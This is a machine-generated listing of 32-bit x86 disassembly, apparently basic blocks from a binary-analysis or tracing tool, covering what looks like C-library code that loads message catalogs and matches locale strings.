0xb02a588:	mov	dword ptr [ebp - 0xe4], edi
0xb02a58e:	add	ecx, eax
0xb02a590:	mov	dword ptr [ebp - 0x98], ecx
0xb02a596:	mov	eax, dword ptr [ebp - 0x94]
0xb02a59c:	xor	ecx, ecx
0xb02a59e:	mov	edi, dword ptr [eax + 0xc]
0xb02a5a1:	test	edi, edi
0xb02a5a3:	je	0xb02a921
None
|
|
|
v
0xb029dd0:	mov	edx, dword ptr [edi]
0xb029dd2:	mov	dword ptr [edi + 4], 0xffffffff
0xb029dd9:	mov	dword ptr [edi + 8], 0
0xb029de0:	test	edx, edx
0xb029de2:	je	0xb029fad
None
|
|
|
v
0xb02b2f4:	movzx	eax, byte ptr [ebp - 0xbc]
0xb02b2fb:	cmp	al, 0x6f
0xb02b2fd:	je	0xb02b3c3
None
|
|
|
v
0xb02a36a:	mov	eax, dword ptr [esi + 0x1c]
0xb02a36d:	mov	dword ptr [ebp - 0x9c], eax
0xb02a373:	mov	eax, dword ptr [esi + 0x20]
0xb02a376:	jmp	0xb02a1bf
None
|
|
|
v
0xb02a5d7:	add	edx, 4
0xb02a5da:	mov	esi, dword ptr [ebp - 0xa0]
0xb02a5e0:	jmp	0xb02a5f6
None
|
|
|
v
0xb02acd2:	call	0xb031970
None
|
|
|
v
0xb02a0c9:	mov	dword ptr [ecx + 0x20], 0
0xb02a0d0:	mov	dword ptr [ecx + 0x24], 0
0xb02a0d7:	mov	dword ptr [ecx + 0x28], 0
0xb02a0de:	mov	eax, dword ptr [ebp - 0x94]
0xb02a0e4:	mov	dword ptr [eax + 0x38], 0
0xb02a0eb:	lea	edx, dword ptr [eax + 0x40]
0xb02a0ee:	mov	dword ptr [eax + 0x3c], 0
0xb02a0f5:	xor	eax, eax
0xb02a0f7:	mov	dword ptr [edx + eax], 0
0xb02a0fe:	add	eax, 4
0xb02a101:	cmp	eax, 0x20
0xb02a104:	jb	0xb02a0f7
None
|
|
|
v
0xb02ab88:	cmp	al, 0x58
0xb02ab8a:	jne	0xb02acd2
None
|
|
|
v
0xb02b067:	lea	esi, dword ptr [ebx - 0x4a94d]
0xb02b06d:	jmp	0xb02a253
None
|
|
|
v
0xb02b294:	movzx	eax, byte ptr [ebp - 0xbc]
0xb02b29b:	cmp	al, 0x6f
0xb02b29d:	je	0xb02b3ef
None
|
|
|
v
0xb02aac6:	lea	esi, dword ptr [ebx - 0x49654]
0xb02aacc:	jmp	0xb02a253
None
|
|
|
v
0xb02b390:	lea	esi, dword ptr [ebx - 0x490fa]
0xb02b396:	jmp	0xb02a253
None
|
|
|
v
0xb02ab13:	movzx	eax, byte ptr [ebp - 0xbc]
0xb02ab1a:	cmp	al, 0x6f
0xb02ab1c:	je	0xb02ad55
None
|
|
|
v
0xb02aa7b:	cmp	byte ptr [eax + 6], 0
0xb02aa7f:	jne	0xb02a323
None
|
|
|
v
0xb02a047:	mov	edx, edi
0xb02a049:	mov	edi, dword ptr [ebp - 0x94]
0xb02a04f:	xchg	ebx, edx
0xb02a051:	mov	eax, 6
0xb02a056:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb029d30:	push	ebp
0xb029d31:	mov	ebp, esp
0xb029d33:	push	edi
0xb029d34:	mov	edi, eax
0xb029d36:	push	esi
0xb029d37:	push	ebx
0xb029d38:	call	0xb1267db
None
|
|
|
v
0xb02ae59:	cmp	byte ptr [eax + 7], 0x54
0xb02ae5d:	jne	0xb02a253
None
|
|
|
v
0xb02ae2a:	lea	esi, dword ptr [ebx - 0x4a955]
0xb02ae30:	jmp	0xb02a253
None
|
|
|
v
0xb02a0a8:	mov	ecx, dword ptr [ebp - 0x94]
0xb02a0ae:	test	ax, ax
0xb02a0b1:	mov	edx, dword ptr [ebp - 0x98]
0xb02a0b7:	mov	dword ptr [ecx + 0x30], edx
0xb02a0ba:	mov	edx, dword ptr [ebp - 0x90]
0xb02a0c0:	mov	dword ptr [ecx + 0x34], edx
0xb02a0c3:	jne	0xb02a180
None
|
|
|
v
0xb02b317:	lea	esi, dword ptr [ebx - 0x49654]
0xb02b31d:	jmp	0xb02a253
None
|
|
|
v
0xb029f56:	mov	ecx, dword ptr [esi + 0x18]
0xb029f59:	mov	dword ptr [ebp - 0xb0], edx
0xb029f5f:	bswap	ecx
0xb029f61:	mov	edx, ecx
0xb029f63:	jmp	0xb02a153
None
|
|
|
v
0xb02aa3a:	movzx	eax, byte ptr [ebp - 0xbc]
0xb02aa41:	cmp	al, 0x6f
0xb02aa43:	je	0xb02abb1
None
|
|
|
v
0xb02b12a:	cmp	al, 0x58
0xb02b12c:	lea	esi, dword ptr [esi]
0xb02b130:	jne	0xb02acd2
None
|
|
|
v
0xb029dc5:	lea	esp, dword ptr [ebp - 0xc]
0xb029dc8:	pop	ebx
0xb029dc9:	pop	esi
0xb029dca:	pop	edi
0xb029dcb:	pop	ebp
0xb029dcc:	ret	
None
|
|
|
v
0xb02adab:	movzx	edx, byte ptr [eax + 9]
0xb02adaf:	cmp	dl, 0x38
0xb02adb2:	je	0xb02b141
None
|
|
|
v
0xb02ad3f:	lea	esi, dword ptr [ebx - 0x4a95d]
0xb02ad45:	jmp	0xb02a253
None
|
|
|
v
0xb02adf6:	cmp	byte ptr [ebp - 0xc0], 0
0xb02adfd:	jne	0xb02b067
None
|
|
|
v
0xb029e2e:	mov	esi, dword ptr [ebp - 0x48]
0xb029e31:	mov	eax, dword ptr [ebp - 0x4c]
0xb029e34:	test	esi, esi
0xb029e36:	mov	dword ptr [ebp - 0xa8], eax
0xb029e3c:	jne	0xb02a04f
None
|
|
|
v
0xb02a717:	add	esi, dword ptr [ebp - 0xcc]
0xb02a71d:	mov	eax, dword ptr [esi]
0xb02a71f:	jmp	0xb02a66a
None
|
|
|
v
0xb02a180:	mov	ecx, dword ptr [ebp - 0x98]
0xb02a186:	test	ecx, ecx
0xb02a188:	je	0xb02a396
None
|
|
|
v
0xb02aa20:	cmp	byte ptr [ebp - 0xc4], 0
0xb02aa27:	jne	0xb02abc7
None
|
|
|
v
0xb02b183:	lea	esi, dword ptr [ebx - 0x47955]
0xb02b189:	jmp	0xb02a253
None
|
|
|
v
0xb02a60c:	mov	eax, dword ptr [ebp - 0xd8]
0xb02a612:	mov	dword ptr [ebp - 0xac], edi
0xb02a618:	mov	edi, dword ptr [ebp - 0x98]
0xb02a61e:	mov	dword ptr [ebp - 0xc4], 0
0xb02a628:	shl	eax, 3
0xb02a62b:	mov	dword ptr [ebp - 0xe0], eax
0xb02a631:	mov	eax, dword ptr [ebp - 0xac]
0xb02a637:	test	eax, eax
0xb02a639:	je	0xb02a6fa
None
|
|
|
v
0xb02acd7:	mov	eax, dword ptr [ebp - 0xc8]
0xb02acdd:	mov	esi, dword ptr [ebp - 0xb0]
0xb02ace3:	mov	edx, dword ptr [eax + esi*4]
0xb02ace6:	jmp	0xb02a5c0
None
|
|
|
v
0xb02aaae:	cmp	al, 0x75
0xb02aab0:	je	0xb02ac3c
None
|
|
|
v
0xb029e88:	xchg	ebx, edx
0xb029e8a:	mov	eax, 6
0xb029e8f:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb02b087:	cmp	byte ptr [eax + 0xb], 0
0xb02b08b:	jne	0xb02a253
None
|
|
|
v
0xb02ac52:	lea	esi, dword ptr [ebx - 0x47075]
0xb02ac58:	jmp	0xb02a253
None
|
|
|
v
0xb02aae3:	xor	esi, esi
0xb02aae5:	cmp	byte ptr [eax + 5], 0x34
0xb02aae9:	jne	0xb02a253
None
|
|
|
v
0xb029da3:	mov	dword ptr [ebx + 0x118c], 0
0xb029dad:	cmp	dword ptr gs:[0xc], 0
0xb029db5:	je	0xb029db8
None
|
|
|
v
0xb02b0ba:	cmp	al, 0x75
0xb02b0bc:	je	0xb02b203
None
|
|
|
v
0xb02a319:	cmp	byte ptr [eax + 5], 0x32
0xb02a31d:	je	0xb02ab45
None
|
|
|
v
0xb029fad:	sub	eax, 1
0xb029fb0:	test	eax, eax
0xb029fb2:	mov	dword ptr [edi + 4], 1
0xb029fb9:	mov	dword ptr [ebx + 0x1188], eax
0xb029fbf:	je	0xb029da3
None
|
|
|
v
0xb02b32c:	cmp	byte ptr [ebp - 0xc4], 0
0xb02b333:	jne	0xb02b3a6
None
|
|
|
v
0xb02abec:	jmp	0xb029fa7
None
|
|
|
v
0xb02a994:	mov	ecx, dword ptr [ebp - 0x9c]
0xb02a99a:	mov	dword ptr [esp], edi
0xb02a99d:	mov	dword ptr [esp + 4], ecx
0xb02a9a1:	mov	dword ptr [esp + 8], eax
0xb02a9a5:	mov	dword ptr [ebp - 0x98], eax
0xb02a9ab:	call	0xb07d0b0
None
|
|
|
v
0xb02a7f8:	mov	esi, dword ptr [ebp - 0x9c]
0xb02a7fe:	test	ecx, ecx
0xb02a800:	mov	edx, dword ptr [esi + eax]
0xb02a803:	je	0xb02a807
None
|
|
|
v
0xb02a008:	test	eax, eax
0xb02a00a:	jle	0xb02a047
None
|
|
|
v
0xb029f68:	xor	eax, eax
0xb029f6a:	mov	dword ptr [esp], eax
0xb029f6d:	call	0xb017470
None
|
|
|
v
0xb02a47c:	mov	ecx, dword ptr [ebp - 0xa0]
0xb02a482:	mov	eax, dword ptr [ecx + eax*4]
0xb02a485:	test	eax, eax
0xb02a487:	je	0xb02a4e9
None
|
|
|
v
0xb02a708:	mov	eax, dword ptr [ebp - 0xb8]
0xb02a70e:	mov	esi, dword ptr [ebp - 0xb0]
0xb02a714:	mov	esi, dword ptr [eax + esi*4]
0xb02a717:	add	esi, dword ptr [ebp - 0xcc]
0xb02a71d:	mov	eax, dword ptr [esi]
0xb02a71f:	jmp	0xb02a66a
None
|
|
|
v
0xb02b1ed:	lea	esi, dword ptr [ebx - 0x47075]
0xb02b1f3:	jmp	0xb02a253
None
|
|
|
v
0xb029dbf:	jne	0xb02b420
None
|
|
|
v
0xb02aee6:	lea	esi, dword ptr [ebx - 0x4a955]
0xb02aeec:	jmp	0xb02a253
None
|
|
|
v
0xb029e20:	mov	edx, dword ptr [ebp - 0x90]
0xb029e26:	test	eax, eax
0xb029e28:	jne	0xb02a04f
None
|
|
|
v
0xb02a396:	mov	eax, dword ptr [ebp - 0x94]
0xb02a39c:	mov	eax, dword ptr [eax + 0x10]
0xb02a39f:	jmp	0xb029f6a
None
|
|
|
v
0xb02ad76:	mov	edx, esi
0xb02ad78:	cmp	dl, 0x4c
0xb02ad7b:	jne	0xb02ae38
None
|
|
|
v
0xb02ac14:	xchg	ebx, edx
0xb02ac16:	mov	eax, dword ptr [esi]
0xb02ac18:	cmp	eax, 0x950412de
0xb02ac1d:	setne	byte ptr [ebp - 0x90]
0xb02ac24:	jne	0xb02aca4
None
|
|
|
v
0xb02af7f:	cmp	byte ptr [eax + 6], 0x52
0xb02af83:	jne	0xb02a253
None
|
|
|
v
0xb02afee:	lea	esi, dword ptr [ebx - 0x4a959]
0xb02aff4:	jmp	0xb02a253
None
|
|
|
v
0xb02a380:	mov	eax, dword ptr [ebp - 0x94]
0xb02a386:	mov	esi, edi
0xb02a388:	mov	edi, dword ptr [ebp - 0xb8]
0xb02a38e:	mov	eax, dword ptr [eax + 0x10]
0xb02a391:	jmp	0xb029f6a
None
|
|
|
v
0xb02ab4f:	cmp	byte ptr [ebp - 0xc4], 0
0xb02ab56:	jne	0xb02ad0c
None
|
|
|
v
0xb02b1af:	lea	esi, dword ptr [ebx - 0x490fa]
0xb02b1b5:	jmp	0xb02a253
None
|
|
|
v
0xb02b420:	lea	eax, dword ptr [ebx + 0x1184]
0xb02b426:	call	0xb0f9460
None
|
|
|
v
0xb02b091:	cmp	byte ptr [ebp - 0xc4], 0
0xb02b098:	jne	0xb02b224
None
|
|
|
v
0xb02a736:	mov	eax, dword ptr [ebp - 0xb8]
0xb02a73c:	mov	edi, dword ptr [ebp - 0xac]
0xb02a742:	mov	edx, dword ptr [eax + edi*4]
0xb02a745:	add	edx, dword ptr [ebp - 0xb0]
0xb02a74b:	cmp	dword ptr [edx + 8], -1
0xb02a74f:	setne	al
0xb02a752:	jmp	0xb02a451
None
|
|
|
v
0xb02b22f:	lea	esi, dword ptr [ebx - 0x4a95d]
0xb02b235:	jmp	0xb02a253
None
|
|
|
v
0xb02af21:	cmp	byte ptr [ebp - 0xc0], 0
0xb02af28:	jne	0xb02b004
None
|
|
|
v
0xb02a01a:	mov	eax, dword ptr [ebp - 0x90]
0xb02a020:	mov	dword ptr [esp + 8], esi
0xb02a024:	mov	dword ptr [esp], edi
0xb02a027:	mov	dword ptr [esp + 4], eax
0xb02a02b:	call	0xb0daf6a
None
|
|
|
v
0xb02a7d5:	mov	edx, dword ptr [ebp - 0x94]
0xb02a7db:	shl	eax, 2
0xb02a7de:	mov	dword ptr [ebp - 0x98], eax
0xb02a7e4:	xor	eax, eax
0xb02a7e6:	mov	dword ptr [ebp - 0xa0], esi
0xb02a7ec:	mov	ecx, dword ptr [edx + 0x34]
0xb02a7ef:	mov	edx, dword ptr [edx + 0x30]
0xb02a7f2:	mov	dword ptr [ebp - 0x9c], edx
0xb02a7f8:	mov	esi, dword ptr [ebp - 0x9c]
0xb02a7fe:	test	ecx, ecx
0xb02a800:	mov	edx, dword ptr [esi + eax]
0xb02a803:	je	0xb02a807
None
|
|
|
v
0xb02b141:	cmp	byte ptr [eax + 0xa], 0
0xb02b145:	jne	0xb02b1d0
None
|
|
|
v
0xb02b3b8:	lea	esi, dword ptr [ebx - 0x47eb9]
0xb02b3be:	jmp	0xb02a253
None
|
|
|
v
0xb02a837:	mov	edi, dword ptr [ebp - 0x9c]
0xb02a83d:	mov	eax, dword ptr [ebp - 0xd0]
0xb02a843:	mov	eax, dword ptr [eax + edi*8 + 4]
0xb02a847:	mov	dword ptr [esp], eax
0xb02a84a:	call	0xb02ce10
None
|
|
|
v
0xb02aeda:	cmp	al, 0x58
0xb02aedc:	lea	esi, dword ptr [esi]
0xb02aee0:	jne	0xb02acd2
None
|
|
|
v
0xb02a929:	mov	eax, dword ptr [ebp - 0xb8]
0xb02a92f:	mov	esi, dword ptr [ebp - 0xb0]
0xb02a935:	mov	edx, dword ptr [eax + esi*4]
0xb02a938:	add	edx, dword ptr [ebp - 0xcc]
0xb02a93e:	cmp	dword ptr [edx + 8], -1
0xb02a942:	setne	al
0xb02a945:	jmp	0xb02a5d3
None
|
|
|
v
0xb02b2ab:	cmp	al, 0x78
0xb02b2ad:	je	0xb02b364
None
|
|
|
v
0xb02a65c:	mov	esi, dword ptr [ebp - 0xcc]
0xb02a662:	bswap	eax
0xb02a664:	add	esi, eax
0xb02a666:	mov	eax, dword ptr [esi]
0xb02a668:	bswap	eax
0xb02a66a:	add	eax, dword ptr [ebp - 0xcc]
0xb02a670:	mov	dword ptr [ebp - 0xbc], eax
0xb02a676:	mov	eax, dword ptr [ebp - 0xc4]
0xb02a67c:	test	eax, eax
0xb02a67e:	mov	eax, dword ptr [ebp - 0xd0]
0xb02a684:	cmovne	eax, dword ptr [ebp - 0xdc]
0xb02a68b:	add	eax, dword ptr [ebp - 0xe0]
0xb02a691:	mov	dword ptr [ebp - 0xd4], eax
0xb02a697:	mov	eax, dword ptr [ebp - 0xac]
0xb02a69d:	test	eax, eax
0xb02a69f:	je	0xb02a94a
None
|
|
|
v
0xb029ed7:	mov	ecx, dword ptr [ebp - 0xa4]
0xb029edd:	mov	dword ptr [edi + 8], eax
0xb029ee0:	mov	dword ptr [eax], esi
0xb029ee2:	mov	dword ptr [eax + 0x10], 0
0xb029ee9:	mov	dword ptr [eax + 4], ecx
0xb029eec:	mov	ecx, dword ptr [ebp - 0xa8]
0xb029ef2:	mov	dword ptr [eax + 8], ecx
0xb029ef5:	movzx	ecx, byte ptr [ebp - 0x90]
0xb029efc:	test	ecx, ecx
0xb029efe:	mov	dword ptr [eax + 0xc], ecx
0xb029f01:	mov	eax, dword ptr [esi + 4]
0xb029f04:	mov	dword ptr [ebp - 0x90], ecx
0xb029f0a:	je	0xb029f0e
None
|
|
|
v
0xb02a771:	mov	eax, dword ptr [esi + 0x28]
0xb02a774:	add	eax, esi
0xb02a776:	mov	dword ptr [ebp - 0xc8], eax
0xb02a77c:	mov	eax, dword ptr [esi + 0x2c]
0xb02a77f:	jmp	0xb02a3cc
None
|
|
|
v
0xb02ab45:	cmp	byte ptr [eax + 6], 0
0xb02ab49:	jne	0xb02a323
None
|
|
|
v
0xb02aa66:	lea	esi, dword ptr [ebx - 0x49654]
0xb02aa6c:	jmp	0xb02a253
None
|
|
|
v
0xb02b00f:	lea	esi, dword ptr [ebx - 0x4a951]
0xb02b015:	jmp	0xb02a253
None
|
|
|
v
0xb02b102:	cmp	byte ptr [ebp - 0xc0], 0
0xb02b109:	jne	0xb02b1ed
None
|
|
|
v
0xb02acaf:	mov	dword ptr [esp], esi
0xb02acb2:	call	0xb017470
None
|
|
|
v
0xb02a323:	xor	esi, esi
0xb02a325:	jmp	0xb02a253
None
|
|
|
v
0xb02b1f8:	lea	esi, dword ptr [ebx - 0x4a842]
0xb02b1fe:	jmp	0xb02a253
None
|
|
|
v
0xb02a496:	mov	edx, dword ptr [ebp - 0x90]
0xb02a49c:	test	edx, edx
0xb02a49e:	jne	0xb02a460
None
|
|
|
v
0xb02b14b:	cmp	byte ptr [ebp - 0xc4], 0
0xb02b152:	jne	0xb02b1c5
None
|
|
|
v
0xb02a971:	cmp	edx, 0xff
0xb02a974:	je	0xb02aa04
None
|
|
|
v
0xb02a106:	mov	edx, dword ptr [ebp - 0x8c]
0xb02a10c:	lea	eax, dword ptr [ebp - 0x80]
0xb02a10f:	mov	dword ptr [esp + 4], eax
0xb02a113:	lea	ecx, dword ptr [ebx - 0x4aa73]
0xb02a119:	mov	eax, edi
0xb02a11b:	mov	dword ptr [esp], 0
0xb02a122:	call	0xb028660
None
|
|
|
v
0xb02b2e7:	cmp	byte ptr [ebp - 0xc0], 0
0xb02b2ee:	jne	0xb02b3ce
None
|
|
|
v
0xb02b07d:	cmp	byte ptr [eax + 0xa], 0x32
0xb02b081:	jne	0xb02a253
None
|
|
|
v
0xb02ad17:	mov	eax, dword ptr [ebp - 0xc8]
0xb02ad1d:	mov	esi, dword ptr [ebp - 0xb0]
0xb02ad23:	mov	eax, dword ptr [eax + esi*4]
0xb02ad26:	jmp	0xb02a65c
None
|
|
|
v
0xb02b072:	lea	esi, dword ptr [ebx - 0x4a951]
0xb02b078:	jmp	0xb02a253
None
|
|
|
v
0xb02b178:	lea	esi, dword ptr [ebx - 0x49654]
0xb02b17e:	jmp	0xb02a253
None
|
|
|
v
0xb02a150:	mov	edx, dword ptr [esi + 0x18]
0xb02a153:	lea	ecx, dword ptr [edx + esi]
0xb02a156:	mov	dword ptr [ebp - 0x98], ecx
0xb02a15c:	jmp	0xb02a0a8
None
|
|
|
v
0xb02ae7b:	cmp	dl, 0x33
0xb02ae7e:	je	0xb02b266
None
|
|
|
v
0xb02b2d0:	cmp	byte ptr [eax + 0xa], 0
0xb02b2d4:	jne	0xb02a253
None
|
|
|
v
0xb02aba6:	lea	esi, dword ptr [ebx - 0x47eb9]
0xb02abac:	jmp	0xb02a253
None
|
|
|
v
0xb02a502:	cmp	dword ptr [ebp - 0xc0], 0
0xb02a509:	mov	esi, dword ptr [ebp - 0xb0]
0xb02a50f:	mov	edi, dword ptr [ebp - 0xc4]
0xb02a515:	je	0xb02a340
None
|
|
|
v
0xb02ab5c:	cmp	byte ptr [ebp - 0xc0], 0
0xb02ab63:	jne	0xb02ad01
None
|
|
|
v
0xb02b0f5:	cmp	byte ptr [ebp - 0xc4], 0
0xb02b0fc:	jne	0xb02b1f8
None
|
|
|
v
0xb02a18e:	mov	edx, dword ptr [ebp - 0x90]
0xb02a194:	mov	eax, dword ptr [esi + 0x24]
0xb02a197:	test	edx, edx
0xb02a199:	je	0xb02a360
None
|
|
|
v
0xb02b3d9:	lea	esi, dword ptr [ebx - 0x4a842]
0xb02b3df:	jmp	0xb02a253
None
|
|
|
v
0xb02a030:	cmp	eax, 0xff
0xb02a033:	jne	0xb02a008
None
|
|
|
v
0xb02a6c9:	add	dword ptr [ebp - 0xc4], 1
0xb02a6d0:	cmp	dword ptr [ebp - 0xc4], 2
0xb02a6d7:	je	0xb02a784
None
|
|
|
v
0xb029e77:	mov	edx, dword ptr [ebp - 0x90]
0xb029e7d:	cmp	eax, 0xff
0xb029e80:	mov	esi, eax
0xb029e82:	je	0xb029fca
None
|
|
|
v
0xb02b36f:	lea	esi, dword ptr [ebx - 0x47955]
0xb02b375:	jmp	0xb02a253
None
|
|
|
v
0xb02a791:	add	dword ptr [ebp - 0xb0], 1
0xb02a798:	mov	eax, dword ptr [ebp - 0xb0]
0xb02a79e:	cmp	dword ptr [ebp - 0xb4], eax
0xb02a7a4:	ja	0xb02a596
None
|
|
|
v
0xb02a8a2:	mov	esi, dword ptr [ebp - 0x90]
0xb02a8a8:	lea	edx, dword ptr [esi + ecx*4]
0xb02a8ab:	mov	esi, dword ptr [edx]
0xb02a8ad:	test	esi, esi
0xb02a8af:	jne	0xb02a890
None
|
|
|
v
0xb02b2da:	cmp	byte ptr [ebp - 0xc4], 0
0xb02b2e1:	jne	0xb02b3d9
None
|
|
|
v
0xb02ac35:	xor	esi, esi
0xb02ac37:	jmp	0xb02a253
None
|
|
|
v
0xb02a5c0:	bswap	edx
0xb02a5c2:	add	edx, dword ptr [ebp - 0xcc]
0xb02a5c8:	mov	eax, dword ptr [edx + 8]
0xb02a5cb:	bswap	eax
0xb02a5cd:	cmp	eax, 0xff
0xb02a5d0:	setne	al
0xb02a5d3:	test	al, al
0xb02a5d5:	je	0xb02a604
None
|
|
|
v
0xb02a84f:	xor	edx, edx
0xb02a851:	mov	esi, eax
0xb02a853:	mov	eax, dword ptr [ebp - 0x94]
0xb02a859:	mov	edi, dword ptr [eax + 0x2c]
0xb02a85c:	mov	eax, esi
0xb02a85e:	div	edi
0xb02a860:	lea	eax, dword ptr [edi - 2]
0xb02a863:	mov	dword ptr [ebp - 0x98], eax
0xb02a869:	mov	eax, esi
0xb02a86b:	mov	ecx, edx
0xb02a86d:	xor	edx, edx
0xb02a86f:	div	dword ptr [ebp - 0x98]
0xb02a875:	lea	eax, dword ptr [edx + 1]
0xb02a878:	mov	esi, eax
0xb02a87a:	mov	dword ptr [ebp - 0x98], eax
0xb02a880:	mov	eax, edi
0xb02a882:	sub	eax, esi
0xb02a884:	sub	esi, edi
0xb02a886:	mov	edi, esi
0xb02a888:	jmp	0xb02a8a2
None
|
|
|
v
0xb02a6dd:	mov	eax, dword ptr [ebp - 0x94]
0xb02a6e3:	mov	eax, dword ptr [eax + 0xc]
0xb02a6e6:	mov	dword ptr [ebp - 0xac], eax
0xb02a6ec:	mov	eax, dword ptr [ebp - 0xac]
0xb02a6f2:	test	eax, eax
0xb02a6f4:	jne	0xb02a63f
None
|
|
|
v
0xb02abf8:	mov	edx, edi
0xb02abfa:	mov	esi, dword ptr [ebp - 0x98]
0xb02ac00:	mov	edi, dword ptr [ebp - 0x94]
0xb02ac06:	xchg	ebx, edx
0xb02ac08:	mov	eax, 6
0xb02ac0d:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb02a950:	mov	eax, dword ptr [esi + 4]
0xb02a953:	jmp	0xb02a6b8
None
|
|
|
v
0xb02a168:	mov	dword ptr [ebp - 0xb0], edx
0xb02a16e:	mov	dword ptr [ebp - 0x98], 0
0xb02a178:	jmp	0xb02a0a8
None
|
|
|
v
0xb02a3a4:	mov	esi, edi
0xb02a3a6:	mov	edi, dword ptr [ebp - 0xb8]
0xb02a3ac:	mov	eax, dword ptr [ebp - 0x90]
0xb02a3b2:	test	eax, eax
0xb02a3b4:	je	0xb02a771
None
|
|
|
v
0xb02a3ba:	mov	eax, dword ptr [esi + 0x28]
0xb02a3bd:	bswap	eax
0xb02a3bf:	add	eax, esi
0xb02a3c1:	mov	dword ptr [ebp - 0xc8], eax
0xb02a3c7:	mov	eax, dword ptr [esi + 0x2c]
0xb02a3ca:	bswap	eax
0xb02a3cc:	add	eax, esi
0xb02a3ce:	mov	dword ptr [ebp - 0xb8], eax
0xb02a3d4:	mov	eax, dword ptr [ebp - 0xb0]
0xb02a3da:	mov	dword ptr [ebp - 0xac], 0
0xb02a3e4:	mov	dword ptr [ebp - 0xc0], 0
0xb02a3ee:	mov	dword ptr [ebp - 0xb0], esi
0xb02a3f4:	shl	eax, 2
0xb02a3f7:	mov	dword ptr [ebp - 0xcc], eax
0xb02a3fd:	mov	dword ptr [ebp - 0xbc], eax
0xb02a403:	mov	dword ptr [ebp - 0xc4], edi
0xb02a409:	mov	dword ptr [ebp - 0x98], 0
0xb02a413:	mov	edi, dword ptr [ebp - 0x90]
0xb02a419:	test	edi, edi
0xb02a41b:	je	0xb02a728
None
|
|
|
v
0xb02a66a:	add	eax, dword ptr [ebp - 0xcc]
0xb02a670:	mov	dword ptr [ebp - 0xbc], eax
0xb02a676:	mov	eax, dword ptr [ebp - 0xc4]
0xb02a67c:	test	eax, eax
0xb02a67e:	mov	eax, dword ptr [ebp - 0xd0]
0xb02a684:	cmovne	eax, dword ptr [ebp - 0xdc]
0xb02a68b:	add	eax, dword ptr [ebp - 0xe0]
0xb02a691:	mov	dword ptr [ebp - 0xd4], eax
0xb02a697:	mov	eax, dword ptr [ebp - 0xac]
0xb02a69d:	test	eax, eax
0xb02a69f:	je	0xb02a94a
None
|
|
|
v
0xb02b3e4:	lea	esi, dword ptr [ebx - 0x47eb9]
0xb02b3ea:	jmp	0xb02a253
None
|
|
|
v
0xb02ad4a:	lea	esi, dword ptr [ebx - 0x4a959]
0xb02ad50:	jmp	0xb02a253
None
|
|
|
v
0xb02a8df:	mov	eax, dword ptr [ebp - 0x94]
0xb02a8e5:	mov	ecx, dword ptr [ebp - 0x9c]
0xb02a8eb:	mov	esi, dword ptr [ebp - 0xa0]
0xb02a8f1:	mov	edi, dword ptr [ebp - 0xac]
0xb02a8f7:	mov	dword ptr [eax + 0x34], 0
0xb02a8fe:	mov	dword ptr [eax + 0x20], ecx
0xb02a901:	mov	ecx, dword ptr [ebp - 0xd0]
0xb02a907:	mov	dword ptr [eax + 0x24], ecx
0xb02a90a:	mov	ecx, dword ptr [ebp - 0xdc]
0xb02a910:	mov	dword ptr [eax + 0x28], ecx
0xb02a913:	mov	ecx, dword ptr [ebp - 0x90]
0xb02a919:	mov	dword ptr [eax + 0x30], ecx
0xb02a91c:	jmp	0xb02a0de
None
|
|
|
v
0xb02ad97:	cmp	byte ptr [eax + 7], 0x53
0xb02ad9b:	jne	0xb02a253
None
|
|
|
v
0xb02a94a:	cmp	dword ptr [esi + 8], -1
0xb02a94e:	jne	0xb02a958
None
|
|
|
v
0xb02a338:	jmp	0xb029f92
None
|
|
|
v
0xb02a890:	mov	esi, dword ptr [ebp - 0x98]
0xb02a896:	lea	edx, dword ptr [ecx + edi]
0xb02a899:	add	esi, ecx
0xb02a89b:	cmp	ecx, eax
0xb02a89d:	mov	ecx, edx
0xb02a89f:	cmovb	ecx, esi
0xb02a8a2:	mov	esi, dword ptr [ebp - 0x90]
0xb02a8a8:	lea	edx, dword ptr [esi + ecx*4]
0xb02a8ab:	mov	esi, dword ptr [edx]
0xb02a8ad:	test	esi, esi
0xb02a8af:	jne	0xb02a890
None
|
|
|
v
0xb02afa9:	movzx	eax, byte ptr [ebp - 0xbc]
0xb02afb0:	cmp	al, 0x6f
0xb02afb2:	je	0xb02b025
None
|
|
|
v
0xb02acc7:	lea	esi, dword ptr [ebx - 0x47955]
0xb02accd:	jmp	0xb02a253
None
|
|
|
v
0xb02a2ce:	cmp	byte ptr [ebp - 0xc0], 0
0xb02a2d5:	jne	0xb02a2f4
None
|
|
|
v
0xb02a9eb:	mov	ecx, dword ptr [ebp - 0x98]
0xb02a9f1:	add	dword ptr [ebp - 0xbc], ecx
0xb02a9f7:	mov	edx, dword ptr [ebp - 0x9c]
0xb02a9fd:	add	edi, ecx
0xb02a9ff:	jmp	0xb02a971
None
|
|
|
v
0xb02ad8d:	cmp	byte ptr [eax + 6], 0x41
0xb02ad91:	jne	0xb02a253
None
|
|
|
v
0xb02a30e:	mov	edx, esi
0xb02a310:	cmp	dl, 0x33
0xb02a313:	jne	0xb02aad8
None
|
|
|
v
0xb02ab78:	cmp	al, 0x75
0xb02ab7a:	je	0xb02aceb
None
|
|
|
v
0xb02aceb:	lea	esi, dword ptr [ebx - 0x47eb9]
0xb02acf1:	jmp	0xb02a253
None
|
|
|
v
0xb02ad81:	xor	esi, esi
0xb02ad83:	cmp	byte ptr [eax + 5], 0x45
0xb02ad87:	jne	0xb02a253
None
|
|
|
v
0xb02aef1:	mov	edx, esi
0xb02aef3:	cmp	dl, 0x4d
0xb02aef6:	jne	0xb02af68
None
|
|
|
v
0xb02b287:	cmp	byte ptr [ebp - 0xc0], 0
0xb02b28e:	jne	0xb02b3fa
None
|
|
|
v
0xb02b303:	cmp	al, 0x75
0xb02b305:	je	0xb02b3b8
None
|
|
|
v
0xb02a9c4:	mov	edx, dword ptr [esi + 4]
0xb02a9c7:	jmp	0xb02a96d
None
|
|
|
v
0xb02ac68:	mov	eax, dword ptr [ebp - 0xc8]
0xb02ac6e:	mov	edi, dword ptr [ebp - 0xac]
0xb02ac74:	mov	edx, dword ptr [eax + edi*4]
0xb02ac77:	jmp	0xb02a43e
None
|
|
|
v
0xb02a6a5:	mov	eax, dword ptr [esi + 8]
0xb02a6a8:	bswap	eax
0xb02a6aa:	cmp	eax, 0xff
0xb02a6ad:	jne	0xb02a958
None
|
|
|
v
0xb02ad60:	lea	esi, dword ptr [ebx - 0x4a94d]
0xb02ad66:	jmp	0xb02a253
None
|
|
|
v
0xb02afd8:	lea	esi, dword ptr [ebx - 0x4a95d]
0xb02afde:	jmp	0xb02a253
None
